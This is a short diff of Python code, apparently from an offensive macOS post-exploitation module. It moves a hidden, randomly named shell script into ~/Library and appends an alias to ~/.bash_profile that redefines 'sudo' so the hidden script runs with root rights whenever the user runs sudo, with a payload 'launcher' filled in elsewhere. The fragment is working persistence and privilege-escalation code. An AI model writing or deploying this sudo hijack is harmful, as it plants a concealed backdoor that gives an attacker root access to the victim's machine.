@@ -91,7 +91,7 @@ from random import choice
 from string import ascii_uppercase
 home =  os.getenv("HOME")
 randomStr = ''.join(choice(ascii_uppercase) for i in range(12))
-bashlocation = home + "/Library/iTunes/." + randomStr + ".sh"
+bashlocation = home + "/Library/." + randomStr + ".sh"
 with open(home + "/.bash_profile", "a") as profile:
     profile.write("alias sudo='sudo sh -c '\\\\''" + bashlocation + " & exec \\"$@\\"'\\\\'' sh'")
 launcher = "%s"
